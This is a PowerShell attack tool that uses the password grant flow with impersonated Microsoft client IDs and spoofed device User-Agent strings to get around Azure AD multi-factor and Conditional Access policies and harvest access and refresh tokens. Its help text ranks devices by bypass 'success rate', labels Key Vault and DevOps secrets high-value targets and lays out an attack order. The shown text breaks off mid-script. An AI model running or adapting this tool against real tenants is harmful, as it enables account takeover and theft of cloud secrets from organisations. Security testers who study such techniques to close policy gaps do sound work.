#Requires -Version 5.1
<#-------------------------------------------------------------
.SYNOPSIS
    Performs an MFA bypass test against Azure AD by simulating a legacy or non-browser client.

.DESCRIPTION
    This script uses the Resource Owner Password Credential (ROPC) grant flow to authenticate directly to Azure AD
    using a supplied username and password. It spoofs the User-Agent header to impersonate a non-browser device
    (such as a PlayStation, Xbox, or IoT client), which are often excluded from Conditional Access policies.

    If successful, the script retrieves an access token, refresh token, and ID token, and stores them in a global
    PowerShell variable ($MFApwn) as a custom object for reuse in the session.

.PARAMETER Username
    The Azure AD username (email format) to authenticate as. If not provided, will prompt interactively.

.PARAMETER Password
    The associated password for the Azure AD account as a SecureString. If not provided, will prompt interactively.

.PARAMETER Resource
    Target resource (API plane) to request token for. See RESOURCE PLANES section below for details.
    Default: ARM.

.PARAMETER UserAgent
    The User-Agent profile to use. Valid values: PlayStation4, PlayStation5, PSVita, XboxOne, NintendoSwitch,
    WiiU, BlackBerry, Symbian, SmartTV, AmazonEcho, Sonos, GenericIoT. Default: PlayStation4.

.PARAMETER ClientApp
    The client application to impersonate. Valid values: AzureCLI, GraphSDK, OneDriveSync, IntunePortal,
    AzurePowerShell, MSTeams. Default: AzurePowerShell.

.PARAMETER Tenant
    The Azure AD tenant to authenticate against. Default: organizations.

.PARAMETER Verbose
    Enable verbose output to see request details.

.PARAMETER SkipTokenTest
    Skip the token validation test after retrieval.

.RESOURCE PLANES
    Azure uses different resource endpoints (planes) for different services. Each token is scoped to a
    specific resource and cannot be used with other APIs. Choose the resource based on your target:

    TIER 1 - Core Infrastructure:
    -----------------------------------------------------------------------------------------
    | Resource     | Endpoint                                  | Purpose                    |
    -----------------------------------------------------------------------------------------
    | ARM          | https://management.azure.com              | Azure Resource Manager     |
    |              |                                           | - Manage subscriptions,    |
    |              |                                           |   resource groups, VMs,    |
    |              |                                           |   networking, etc.         |
    |              |                                           | - Full Azure portal access |
    -----------------------------------------------------------------------------------------
    | Graph        | https://graph.microsoft.com               | Microsoft Graph API        |
    |              |                                           | - Users, groups, directory |
    |              |                                           | - Mail, calendar, contacts |
    |              |                                           | - OneDrive, SharePoint     |
    |              |                                           | - Teams messages           |
    -----------------------------------------------------------------------------------------
    | KeyVault     | https://vault.azure.net                   | Azure Key Vault            |
    |              |                                           | - Secrets (passwords, keys)|
    |              |                                           | - Certificates             |
    |              |                                           | - Cryptographic keys       |
    |              |                                           | HIGH VALUE TARGET          |
    -----------------------------------------------------------------------------------------

    TIER 2 - Data & Storage:
    -----------------------------------------------------------------------------------------
    | Resource     | Endpoint                                  | Purpose                    |
    -----------------------------------------------------------------------------------------
    | Storage      | https://storage.azure.com                 | Azure Storage Data Plane   |
    |              |                                           | - Blob containers          |
    |              |                                           | - File shares              |
    |              |                                           | - Queues, Tables           |
    -----------------------------------------------------------------------------------------
    | SQLDatabase  | https://database.windows.net              | Azure SQL Database         |
    |              |                                           | - Direct SQL access        |
    |              |                                           | - Requires AAD auth enabled|
    -----------------------------------------------------------------------------------------
    | DataLake     | https://datalake.azure.net                | Azure Data Lake Gen1       |
    |              |                                           | - Big data storage         |
    |              |                                           | - Analytics workloads      |
    -----------------------------------------------------------------------------------------

    TIER 3 - DevOps & Development:
    -----------------------------------------------------------------------------------------
    | Resource     | Endpoint                                  | Purpose                    |
    -----------------------------------------------------------------------------------------
    | DevOps       | https://app.vssps.visualstudio.com        | Azure DevOps Services      |
    |              |                                           | - Source code repos        |
    |              |                                           | - Build pipelines          |
    |              |                                           | - Variable groups (secrets)|
    |              |                                           | HIGH VALUE TARGET          |
    -----------------------------------------------------------------------------------------
    | LogAnalytics | https://api.loganalytics.io               | Log Analytics Workspaces   |
    |              |                                           | - Query security logs      |
    |              |                                           | - Audit trails             |
    |              |                                           | - Application insights     |
    -----------------------------------------------------------------------------------------
    | Monitor      | https://monitor.azure.com                 | Azure Monitor              |
    |              |                                           | - Metrics and alerts       |
    |              |                                           | - Diagnostic settings      |
    -----------------------------------------------------------------------------------------

    TIER 4 - Messaging & Events:
    -----------------------------------------------------------------------------------------
    | Resource     | Endpoint                                  | Purpose                    |
    -----------------------------------------------------------------------------------------
    | ServiceBus   | https://servicebus.azure.net              | Azure Service Bus          |
    |              |                                           | - Message queues           |
    |              |                                           | - Pub/sub topics           |
    -----------------------------------------------------------------------------------------
    | EventHubs    | https://eventhubs.azure.net               | Azure Event Hubs           |
    |              |                                           | - Event streaming          |
    |              |                                           | - Telemetry ingestion      |
    -----------------------------------------------------------------------------------------

    TIER 5 - Microsoft 365 & Business Apps:
    -----------------------------------------------------------------------------------------
    | Resource     | Endpoint                                  | Purpose                    |
    -----------------------------------------------------------------------------------------
    | Exchange     | https://outlook.office365.com             | Exchange Online            |
    |              |                                           | - Mailbox access (EWS)     |
    |              |                                           | - Calendar operations      |
    |              |                                           | - Use Graph for modern API |
    -----------------------------------------------------------------------------------------
    | SharePoint   | https://microsoft.sharepoint-df.com       | SharePoint Online          |
    |              |                                           | - Site collections         |
    |              |                                           | - Document libraries       |
    |              |                                           | - Use Graph for modern API |
    -----------------------------------------------------------------------------------------
    | PowerBI      | https://analysis.windows.net/powerbi/api  | Power BI Service           |
    |              |                                           | - Reports and dashboards   |
    |              |                                           | - Datasets                 |
    |              |                                           | - Business intelligence    |
    -----------------------------------------------------------------------------------------
    | Intune       | https://api.manage.microsoft.com          | Microsoft Intune           |
    |              |                                           | - Device management        |
    |              |                                           | - App deployment           |
    |              |                                           | - Compliance policies      |
    -----------------------------------------------------------------------------------------
    | Dynamics     | https://globaldisco.crm.dynamics.com      | Dynamics 365               |
    |              |                                           | - CRM data access          |
    |              |                                           | - Customer records         |
    |              |                                           | - Sales, service data      |
    -----------------------------------------------------------------------------------------

    RECOMMENDED TESTING ORDER:
    1. ARM        - Check Azure resource access, enumerate subscriptions
    2. Graph      - User info, group memberships, mail access
    3. KeyVault   - High-value secrets and certificates
    4. DevOps     - Source code and pipeline secrets
    5. Storage    - Blob data, file shares
    6. Others     - Based on target environment

.USER-AGENT PROFILES
    The script spoofs User-Agent headers to impersonate devices that are commonly excluded from
    Conditional Access MFA policies. Organizations often exclude legacy clients, IoT devices,
    and meeting room systems to avoid breaking functionality.

    CATEGORY 1 - Gaming Consoles (Classic bypass vectors):
    -----------------------------------------------------------------------------------------
    | Profile          | Device                    | Why It Works                          |
    -----------------------------------------------------------------------------------------
    | PlayStation4     | Sony PlayStation 4        | Gaming consoles excluded from CA      |
    | PlayStation5     | Sony PlayStation 5        | Modern console, often not in policies |
    | PSVita           | PlayStation Vita          | Handheld, legacy device               |
    | XboxOne          | Microsoft Xbox One        | Microsoft device, may be trusted      |
    | NintendoSwitch   | Nintendo Switch           | Captive portal client                 |
    | WiiU             | Nintendo Wii U            | Legacy console                        |
    -----------------------------------------------------------------------------------------

    CATEGORY 2 - Legacy Enterprise (HIGH SUCCESS RATE):
    -----------------------------------------------------------------------------------------
    | Profile          | Device                    | Why It Works                          |
    -----------------------------------------------------------------------------------------
    | Outlook2013      | Microsoft Outlook 2013    | Legacy Office often explicitly        |
    | Outlook2010      | Microsoft Outlook 2010    |   excluded to support older clients   |
    | WindowsPhone     | Windows Phone 10          | Discontinued platform, still excluded |
    | Windows7IE       | IE 11 on Windows 7        | Legacy Windows in many enterprises    |
    -----------------------------------------------------------------------------------------

    CATEGORY 3 - Conferencing & Meeting Rooms (VERY HIGH SUCCESS RATE):
    -----------------------------------------------------------------------------------------
    | Profile          | Device                    | Why It Works                          |
    -----------------------------------------------------------------------------------------
    | TeamsRoom        | Microsoft Teams Room      | Meeting room devices almost always    |
    | SurfaceHub       | Microsoft Surface Hub     |   excluded - can't do interactive MFA |
    | PolycomTrio      | Polycom Trio System       | Conference phones need cloud access   |
    | CiscoWebex       | Cisco Webex Device        | Enterprise video conferencing         |
    | ZoomRooms        | Zoom Rooms Controller     | Hardware-based Zoom systems           |
    -----------------------------------------------------------------------------------------

    CATEGORY 4 - Printers & Office Equipment:
    -----------------------------------------------------------------------------------------
    | Profile          | Device                    | Why It Works                          |
    -----------------------------------------------------------------------------------------
    | HPPrinter        | HP Network Printer        | Scan-to-email needs authentication    |
    | XeroxMFP         | Xerox Multifunction       | Enterprise printers often excluded    |
    | CanonPrinter     | Canon imageRUNNER         | Large office equipment                |
    | RicohPrinter     | Ricoh Aficio MFP          | Common enterprise printer             |
    -----------------------------------------------------------------------------------------

    CATEGORY 5 - Embedded & Industrial Systems:
    -----------------------------------------------------------------------------------------
    | Profile          | Device                    | Why It Works                          |
    -----------------------------------------------------------------------------------------
    | WindowsIoT       | Windows IoT Core          | IoT devices can't do interactive auth |
    | WindowsEmbedded  | Windows Embedded/POSReady | Kiosks, POS, ATMs                     |
    | LinuxKiosk       | Linux Kiosk Device        | Digital signage, info displays        |
    | POSTerminal      | Point-of-Sale System      | Retail systems need cloud access      |
    | GenericIoT       | Generic IoT Device        | Catch-all IoT profile                 |
    -----------------------------------------------------------------------------------------

    CATEGORY 6 - Healthcare & Medical (Often have blanket exclusions):
    -----------------------------------------------------------------------------------------
    | Profile          | Device                    | Why It Works                          |
    -----------------------------------------------------------------------------------------
    | EPICClient       | Epic EHR System           | Healthcare systems need 24/7 access   |
    | CernerPowerChart | Cerner PowerChart         | Medical records - can't interrupt     |
    | MedicalDevice    | Generic Medical Device    | Clinical devices often whitelisted    |
    -----------------------------------------------------------------------------------------

    CATEGORY 7 - Legacy Mobile:
    -----------------------------------------------------------------------------------------
    | Profile          | Device                    | Why It Works                          |
    -----------------------------------------------------------------------------------------
    | BlackBerry       | BlackBerry OS 6           | Legacy mobile platform                |
    | Symbian          | Nokia Symbian S60         | Ancient but sometimes still excluded  |
    | AndroidLegacy    | Android 4.4 (KitKat)      | Very old Android version              |
    | OldiOS           | iOS 9                     | Old iPhone/iPad                       |
    | FeaturePhone     | Nokia Series 40           | Basic feature phone                   |
    -----------------------------------------------------------------------------------------

    CATEGORY 8 - Smart Home & Consumer IoT:
    -----------------------------------------------------------------------------------------
    | Profile          | Device                    | Why It Works                          |
    -----------------------------------------------------------------------------------------
    | SmartTV          | Samsung Tizen Smart TV    | Smart TVs with Microsoft apps         |
    | AmazonEcho       | Amazon Echo/Fire          | Voice assistants may access M365      |
    | Sonos            | Sonos Speaker             | Smart speakers                        |
    -----------------------------------------------------------------------------------------

    CATEGORY 9 - Azure & Microsoft Services:
    -----------------------------------------------------------------------------------------
    | Profile          | Device                    | Why It Works                          |
    -----------------------------------------------------------------------------------------
    | AzureADConnect   | Azure AD Connect Sync     | Sync services bypass interactive MFA  |
    | AzureBackup      | Azure Backup Agent        | Backup services need unattended auth  |
    | PowerAutomate    | Power Automate Flow       | Automation flows run unattended       |
    -----------------------------------------------------------------------------------------

    RECOMMENDED USER-AGENT TESTING ORDER:
    1. TeamsRoom / SurfaceHub  - Meeting room devices (highest success rate)
    2. Outlook2013 / Outlook2010 - Legacy Outlook (very commonly excluded)
    3. HPPrinter / XeroxMFP    - Enterprise printers (scan-to-email scenarios)
    4. WindowsEmbedded / POSTerminal - Embedded systems
    5. Gaming consoles         - Classic bypass vectors
    6. AzureADConnect          - Service account scenarios

.OUTPUTS
    - If successful, the access token is stored in $MFApwn.access_token
    - You can then use this token to make authenticated API requests to the selected resource

.EXAMPLE
    .\UA_MFA_bypass.ps1
    # Interactive mode - prompts for credentials, uses ARM resource with PlayStation4 UA

.EXAMPLE
    .\UA_MFA_bypass.ps1 -Username "user@domain.com" -Resource Graph -UserAgent XboxOne -Verbose
    # Target Microsoft Graph API with Xbox User-Agent

.EXAMPLE
    .\UA_MFA_bypass.ps1 -Resource KeyVault -ClientApp AzureCLI -Tenant contoso.onmicrosoft.com
    # Target Key Vault in specific tenant

.EXAMPLE
    .\UA_MFA_bypass.ps1 -Resource DevOps -UserAgent GenericIoT
    # Target Azure DevOps with IoT device User-Agent

.EXAMPLE
    # After successful run, use the token:
    $MFApwn.access_token     # Raw access token
    $MFApwn.refresh_token    # Refresh token for token renewal
    $MFApwn.id_token         # Identity claims token

    # ARM example:
    Invoke-RestMethod -Headers @{Authorization = "Bearer $($MFApwn.access_token)"} `
        -Uri "https://management.azure.com/subscriptions?api-version=2020-01-01"

    # Graph example:
    Invoke-RestMethod -Headers @{Authorization = "Bearer $($MFApwn.access_token)"} `
        -Uri "https://graph.microsoft.com/v1.0/me"

    # Key Vault example (list vaults via ARM, access secrets via KeyVault token):
    Invoke-RestMethod -Headers @{Authorization = "Bearer $($MFApwn.access_token)"} `
        -Uri "https://myvault.vault.azure.net/secrets?api-version=7.4"

.NOTES
    - This script is intended for authorized security testing only.
    - Ensure you have explicit permission before testing any tenant.
    - Tokens are scoped to a single resource - request new tokens for different APIs.
    - Some resources require specific permissions or tenant configuration.
    - The spoofed User-Agent helps bypass Conditional Access policies that exclude legacy clients.

.AUTHOR
    @fhd342gs
-----------------------------------------------------------#>

[CmdletBinding()]
param(
    [Parameter(Mandatory = $false)]
    [string]$Username,

    [Parameter(Mandatory = $false)]
    [securestring]$Password,

    [Parameter(Mandatory = $false)]
    [ValidateSet("ARM", "Graph", "KeyVault", "Storage", "SQLDatabase", "DataLake",
                 "DevOps", "LogAnalytics", "Monitor", "ServiceBus", "EventHubs",
                 "Exchange", "SharePoint", "PowerBI", "Intune", "Dynamics")]
    [string]$Resource = "ARM",

    [Parameter(Mandatory = $false)]
    [ValidateSet(
        # Gaming Consoles
        "PlayStation4", "PlayStation5", "PSVita", "XboxOne", "NintendoSwitch", "WiiU",
        # Legacy Enterprise
        "Outlook2013", "Outlook2010", "WindowsPhone", "Windows7IE",
        # Conferencing & Meeting Rooms
        "TeamsRoom", "SurfaceHub", "PolycomTrio", "CiscoWebex", "ZoomRooms",
        # Printers & Office Equipment
        "HPPrinter", "XeroxMFP", "CanonPrinter", "RicohPrinter",
        # Embedded & Industrial
        "WindowsIoT", "WindowsEmbedded", "LinuxKiosk", "POSTerminal", "GenericIoT",
        # Healthcare & Medical
        "EPICClient", "CernerPowerChart", "MedicalDevice",
        # Legacy Mobile
        "BlackBerry", "Symbian", "AndroidLegacy", "OldiOS", "FeaturePhone",
        # Smart Home & Consumer IoT
        "SmartTV", "AmazonEcho", "Sonos",
        # Azure & Microsoft Services
        "AzureADConnect", "AzureBackup", "PowerAutomate"
    )]
    [string]$UserAgent = "PlayStation4",

    [Parameter(Mandatory = $false)]
    [ValidateSet("AzureCLI", "GraphSDK", "OneDriveSync", "IntunePortal", "AzurePowerShell", "MSTeams")]
    [string]$ClientApp = "AzurePowerShell",

    [Parameter(Mandatory = $false)]
    [string]$Tenant = "organizations",

    [Parameter(Mandatory = $false)]
    [switch]$SkipTokenTest
)

# ============================================================================
# Load required assemblies
# ============================================================================
Add-Type -AssemblyName System.Web

# ============================================================================
# Configuration Lookups
# ============================================================================

# User-Agent strings organized by category
# See .USER-AGENT PROFILES in help documentation for details
$UserAgents = @{
    # -------------------------------------------------------------------------
    # CATEGORY 1 - Gaming Consoles (Classic bypass vectors)
    # -------------------------------------------------------------------------
    "PlayStation4"   = "Mozilla/5.0 (PlayStation 4 3.11) AppleWebKit/537.73 (KHTML, like Gecko)"
    "PlayStation5"   = "Mozilla/5.0 (PlayStation 5 4.03) AppleWebKit/605.1.15 (KHTML, like Gecko)"
    "PSVita"         = "Mozilla/5.0 (PlayStation Vita 3.60) AppleWebKit/537.73 (KHTML, like Gecko)"
    "XboxOne"        = "Xbox/One/10.0.10586.1100 Mozilla/5.0"
    "NintendoSwitch" = "Mozilla/5.0 (Nintendo Switch; WifiWebAuthApplet) AppleWebKit/601.6 (KHTML, like Gecko)"
    "WiiU"           = "Mozilla/5.0 (Nintendo WiiU) AppleWebKit/536.30 (KHTML, like Gecko)"

    # -------------------------------------------------------------------------
    # CATEGORY 2 - Legacy Enterprise (HIGH SUCCESS RATE)
    # -------------------------------------------------------------------------
    "Outlook2013"    = "Microsoft Office/15.0 (Windows NT 6.1; Microsoft Outlook 15.0.4420.1017; Pro)"
    "Outlook2010"    = "Microsoft Office/14.0 (Windows NT 6.1; Microsoft Outlook 14.0.7015.1000; Pro)"
    "WindowsPhone"   = "Mozilla/5.0 (Windows Phone 10.0; Android 6.0.1; Microsoft; Lumia 950) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Mobile Safari/537.36 Edge/15.15254"
    "Windows7IE"     = "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko"

    # -------------------------------------------------------------------------
    # CATEGORY 3 - Conferencing & Meeting Rooms (VERY HIGH SUCCESS RATE)
    # -------------------------------------------------------------------------
    "TeamsRoom"      = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Teams/1.5.00.36367 Chrome/85.0.4183.121 Electron/10.4.7 Safari/537.36 RoomWindows/4.12.139.0"
    "SurfaceHub"     = "Mozilla/5.0 (Windows NT 10.0; Win64; x64; SurfaceHub) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.102 Safari/537.36 Edge/18.17763"
    "PolycomTrio"    = "Odin/1.0.0.0 (Odin; Odin; Odin; Odin) Odin/1.0.0.0"
    "CiscoWebex"     = "Cisco-WebEx-Client/41.2.0.18299"
    "ZoomRooms"      = "Mozilla/5.0 (Linux; Android 9; ZoomRoomController) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.136 Safari/537.36 ZoomRooms/5.6.0"

    # -------------------------------------------------------------------------
    # CATEGORY 4 - Printers & Office Equipment
    # -------------------------------------------------------------------------
    "HPPrinter"      = "HP-ChaiServer/3.0"
    "XeroxMFP"       = "Xerox_MFP Mozilla/4.0 (compatible; MSIE 6.0)"
    "CanonPrinter"   = "Canon iR-ADV C5535/5540 III"
    "RicohPrinter"   = "RICOH MP C3004ex"

    # -------------------------------------------------------------------------
    # CATEGORY 5 - Embedded & Industrial Systems
    # -------------------------------------------------------------------------
    "WindowsIoT"     = "Mozilla/5.0 (Windows IoT 10.0; ARM; Lumia 950 XL) AppleWebKit/537.36"
    "WindowsEmbedded"= "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; POSReady2009)"
    "LinuxKiosk"     = "Mozilla/5.0 (X11; Linux armv7l) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.157 Safari/537.36 Kiosk"
    "POSTerminal"    = "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0; SLCC2; POSReady 7)"
    "GenericIoT"     = "iot-device/1.0 (Linux; U; Android 9; en-us; IoT Build/PI)"

    # -------------------------------------------------------------------------
    # CATEGORY 6 - Healthcare & Medical
    # -------------------------------------------------------------------------
    "EPICClient"     = "Epic/2020 (Windows NT 10.0; Win64; x64; EpicCare EMR)"
    "CernerPowerChart"= "Cerner PowerChart/2018.01 (Windows NT 10.0; Win64)"
    "MedicalDevice"  = "Mozilla/5.0 (Linux; Medical Device v2.0) AppleWebKit/537.36 FHIR/4.0"

    # -------------------------------------------------------------------------
    # CATEGORY 7 - Legacy Mobile
    # -------------------------------------------------------------------------
    "BlackBerry"     = "BlackBerry9700/5.0.0.862 Profile/MIDP-2.1 Configuration/CLDC-1.1 VendorID/331"
    "Symbian"        = "Mozilla/5.0 (SymbianOS/9.4; Series60/5.0 Nokia5800d-1/52.50.2008.21; Profile/MIDP-2.1 Configuration/CLDC-1.1) AppleWebKit/525 (KHTML, like Gecko) BrowserNG/7.1.12344"
    "AndroidLegacy"  = "Mozilla/5.0 (Linux; Android 4.4.2; Nexus 5 Build/KOT49H) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2490.76 Mobile Safari/537.36"
    "OldiOS"         = "Mozilla/5.0 (iPhone; CPU iPhone OS 9_3_5 like Mac OS X) AppleWebKit/601.1.46 (KHTML, like Gecko) Version/9.0 Mobile/13G36 Safari/601.1"
    "FeaturePhone"   = "Mozilla/5.0 (Series40; Nokia200/11.81; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/2.0.2.68.14"

    # -------------------------------------------------------------------------
    # CATEGORY 8 - Smart Home & Consumer IoT
    # -------------------------------------------------------------------------
    "SmartTV"        = "Mozilla/5.0 (SMART-TV; Linux; Tizen 5.0) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/2.2 Chrome/63.0.3239.84 TV Safari/537.36"
    "AmazonEcho"     = "Dalvik/2.1.0 (Linux; U; Android 5.1.1; AFTS Build/LVY48F) AlexaMediaPlayer"
    "Sonos"          = "Linux UPnP/1.0 Sonos/63.2-88230 (ICRU_S21)"

    # -------------------------------------------------------------------------
    # CATEGORY 9 - Azure & Microsoft Services
    # -------------------------------------------------------------------------
    "AzureADConnect" = "Azure AD Connect/2.0.89.0"
    "AzureBackup"    = "Microsoft Azure Recovery Services Agent/2.0.9202.0"
    "PowerAutomate"  = "Microsoft Power Automate/2.0 (Windows; Flow)"
}

# Resource URLs (API Planes)
$Resources = @{
    # Tier 1 - Core Infrastructure
    "ARM"          = "https://management.azure.com"
    "Graph"        = "https://graph.microsoft.com"
    "KeyVault"     = "https://vault.azure.net"

    # Tier 2 - Data & Storage
    "Storage"      = "https://storage.azure.com"
    "SQLDatabase"  = "https://database.windows.net"
    "DataLake"     = "https://datalake.azure.net"

    # Tier 3 - DevOps & Development
    "DevOps"       = "https://app.vssps.visualstudio.com"
    "LogAnalytics" = "https://api.loganalytics.io"
    "Monitor"      = "https://monitor.azure.com"

    # Tier 4 - Messaging & Events
    "ServiceBus"   = "https://servicebus.azure.net"
    "EventHubs"    = "https://eventhubs.azure.net"

    # Tier 5 - Microsoft 365 & Business Apps
    "Exchange"     = "https://outlook.office365.com"
    "SharePoint"   = "https://microsoft.sharepoint-df.com"
    "PowerBI"      = "https://analysis.windows.net/powerbi/api"
    "Intune"       = "https://api.manage.microsoft.com"
    "Dynamics"     = "https://globaldisco.crm.dynamics.com"
}

# Client application IDs
$ClientApps = @{
    "AzureCLI"       = "04b07795-8ddb-461a-bbee-02f9e1bf7b46"
    "GraphSDK"       = "a0c73c16-a7e3-4564-9a95-2bdf47383716"
    "OneDriveSync"   = "b26aadf8-566f-4478-926f-589f601d9c74"
    "IntunePortal"   = "ddc29362-4cc5-4cd0-b5b6-9b998b8c7d5b"
    "AzurePowerShell"= "1b730954-1685-4b74-9bfd-dac224a7b894"
    "MSTeams"        = "d3590ed6-52b3-4102-aeff-aad2292ab01c"
}

# Test endpoints for token validation
# Note: Some resources don't have simple test endpoints - use $null to skip validation
$TestEndpoints = @{
    # Tier 1 - Core Infrastructure
    "ARM"          = "https://management.azure.com/subscriptions?api-version=2020-01-01"
    "Graph"        = "https://graph.microsoft.com/v1.0/me"
    "KeyVault"     = $null  # Requires specific vault URL - skip auto-test

    # Tier 2 - Data & Storage
    "Storage"      = $null  # Requires specific storage account - skip auto-test
    "SQLDatabase"  = $null  # Requires specific database - skip auto-test
    "DataLake"     = $null  # Requires specific data lake - skip auto-test

    # Tier 3 - DevOps & Development
    "DevOps"       = "https://app.vssps.visualstudio.com/_apis/profile/profiles/me?api-version=6.0"
    "LogAnalytics" = "https://api.loganalytics.io/v1/workspaces"
    "Monitor"      = $null  # Requires specific resource context - skip auto-test

    # Tier 4 - Messaging & Events
    "ServiceBus"   = $null  # Requires specific namespace - skip auto-test
    "EventHubs"    = $null  # Requires specific namespace - skip auto-test

    # Tier 5 - Microsoft 365 & Business Apps
    "Exchange"     = "https://outlook.office365.com/api/v2.0/me"
    "SharePoint"   = $null  # Requires specific tenant SharePoint URL - skip auto-test
    "PowerBI"      = "https://api.powerbi.com/v1.0/myorg/groups"
    "Intune"       = "https://graph.microsoft.com/v1.0/me"  # Intune uses Graph for validation
    "Dynamics"     = "https://globaldisco.crm.dynamics.com/api/discovery/v2.0/Instances"
}

# ============================================================================
# Helper Functions
# ============================================================================

function Clear-SensitiveData {
    <#
    .SYNOPSIS
        Clears sensitive variables from memory.
    #>
    param(
        [string[]]$VariableNames
    )

    foreach ($varName in $VariableNames) {
        if (Get-Variable -Name $varName -Scope Script -ErrorAction SilentlyContinue) {
            Set-Variable -Name $varName -Value $null -Scope Script
        }
    }
    [GC]::Collect()
}

function ConvertFrom-JwtToken {
    <#
    .SYNOPSIS
        Decodes a JWT token and returns the payload as a PowerShell object.
    #>
    param(
        [Parameter(Mandatory = $true)]
        [string]$Token
    )

    try {
        $parts = $Token.Split('.')
        if ($parts.Count -ne 3) {
            throw "Invalid JWT format"
        }

        # Decode the payload (second part)
        $payload = $parts[1]

        # Add padding if necessary
        switch ($payload.Length % 4) {
            2 { $payload += "==" }
            3 { $payload += "=" }
        }

        # Replace URL-safe characters
        $payload = $payload.Replace('-', '+').Replace('_', '/')

        $decodedBytes = [Convert]::FromBase64String($payload)
        $decodedText = [System.Text.Encoding]::UTF8.GetString($decodedBytes)

        return $decodedText | ConvertFrom-Json
    }
    catch {
        Write-Warning "Failed to decode JWT: $_"
        return $null
    }
}

function Format-TokenExpiry {
    <#
    .SYNOPSIS
        Converts Unix timestamp to readable datetime.
    #>
    param(
        [Parameter(Mandatory = $true)]
        [long]$UnixTimestamp
    )

    $epoch = [datetime]::new(1970, 1, 1, 0, 0, 0, [DateTimeKind]::Utc)
    return $epoch.AddSeconds($UnixTimestamp).ToLocalTime()
}

function Test-AccessToken {
    <#
    .SYNOPSIS
        Tests if the access token is valid by making a request to the appropriate endpoint.
    .OUTPUTS
        $true  - Token validated successfully
        $false - Token validation failed
        $null  - No test endpoint available for this resource
    #>
    param(
        [Parameter(Mandatory = $true)]
        [string]$AccessToken,

        [Parameter(Mandatory = $true)]
        [string]$Resource
    )

    $testUri = $TestEndpoints[$Resource]

    # Some resources don't have simple test endpoints
    if (-not $testUri) {
        return $null
    }

    try {
        $testHeaders = @{
            "Authorization" = "Bearer $AccessToken"
        }

        $null = Invoke-RestMethod -Method GET -Uri $testUri -Headers $testHeaders -ErrorAction Stop
        return $true
    }
    catch {
        return $false
    }
}

# ============================================================================
# Main Script
# ============================================================================

# Prompt for credentials if not provided
if (-not $Username) {
    $Username = Read-Host "Enter username (email)"
}

if (-not $Password) {
    $Password = Read-Host "Enter password" -AsSecureString
}

# Convert SecureString to plaintext (required for ROPC flow)
# Note: Use PtrToStringBSTR (not PtrToStringAuto) for cross-platform compatibility
$BSTR = [Runtime.InteropServices.Marshal]::SecureStringToBSTR($Password)
$UnsecurePassword = [Runtime.InteropServices.Marshal]::PtrToStringBSTR($BSTR)
[Runtime.InteropServices.Marshal]::ZeroFreeBSTR($BSTR)

# Resolve configuration values
$selectedUserAgent = $UserAgents[$UserAgent]
$selectedResource = $Resources[$Resource]
$selectedClientId = $ClientApps[$ClientApp]
$tokenEndpoint = "https://login.microsoftonline.com/$Tenant/oauth2/token"

# Display configuration if verbose
if ($VerbosePreference -eq 'Continue' -or $PSCmdlet.MyInvocation.BoundParameters['Verbose']) {
    Write-Host "`n[*] Configuration:" -ForegroundColor Cyan
    Write-Host "    Tenant:     $Tenant"
    Write-Host "    Resource:   $selectedResource"
    Write-Host "    Client ID:  $selectedClientId ($ClientApp)"
    Write-Host "    User-Agent: $UserAgent"
    Write-Host "    Endpoint:   $tokenEndpoint"
    Write-Host ""
}

# URL-encode values to handle special characters like '!'
$EncodedPassword = [System.Web.HttpUtility]::UrlEncode($UnsecurePassword)
$EncodedUsername = [System.Web.HttpUtility]::UrlEncode($Username)

# Prepare request body as string to prevent double-encoding
$Body = "resource=$([System.Web.HttpUtility]::UrlEncode($selectedResource))&client_id=$selectedClientId&grant_type=password&username=$EncodedUsername&password=$EncodedPassword&scope=openid"

# Prepare request headers
$Headers = @{
    "User-Agent"   = $selectedUserAgent
    "Content-Type" = "application/x-www-form-urlencoded"
}

try {
    Write-Host "`n[*] Attempting authentication..." -ForegroundColor Cyan

    $response = Invoke-RestMethod -Method POST -Uri $tokenEndpoint -Headers $Headers -Body $Body -ErrorAction Stop

    if ($response.access_token) {
        Write-Host "[+] Token retrieved successfully!" -ForegroundColor Green

        # Create token object
        $Global:MFApwn = [pscustomobject]@{
            access_token  = $response.access_token
            refresh_token = $response.refresh_token
            id_token      = $response.id_token
            token_type    = $response.token_type
            expires_in    = $response.expires_in
            resource      = $selectedResource
            retrieved_at  = Get-Date
        }

        Write-Host "`n[+] Tokens stored in `$MFApwn" -ForegroundColor Green
        Write-Host "    Usage: `$MFApwn.access_token" -ForegroundColor Gray

        # Decode and display token info
        $decodedToken = ConvertFrom-JwtToken -Token $response.access_token
        if ($decodedToken) {
            Write-Host "`n[*] Token Details:" -ForegroundColor Cyan
            Write-Host "    Subject:  $($decodedToken.upn ?? $decodedToken.sub)" -ForegroundColor Gray
            Write-Host "    Audience: $($decodedToken.aud)" -ForegroundColor Gray

            if ($decodedToken.exp) {
                $expiry = Format-TokenExpiry -UnixTimestamp $decodedToken.exp
                Write-Host "    Expires:  $expiry" -ForegroundColor Gray
            }

            if ($decodedToken.iss) {
                Write-Host "    Issuer:   $($decodedToken.iss)" -ForegroundColor Gray
            }
        }

        # Test token validity
        if (-not $SkipTokenTest) {
            Write-Host "`n[*] Validating token..." -ForegroundColor Cyan
            $isValid = Test-AccessToken -AccessToken $response.access_token -Resource $Resource

            if ($null -eq $isValid) {
                Write-Host "[*] No test endpoint available for $Resource - skipping validation." -ForegroundColor Gray
                Write-Host "    Token was retrieved successfully and should be valid." -ForegroundColor Gray
            }
            elseif ($isValid) {
                Write-Host "[+] Token validated successfully - authentication working!" -ForegroundColor Green
            }
            else {
                Write-Host "[!] Token retrieved but validation request failed." -ForegroundColor Yellow
                Write-Host "    Token may still be valid for other operations." -ForegroundColor Gray
            }
        }

        # Show example usage based on resource
        Write-Host "`n[*] Example usage:" -ForegroundColor Cyan
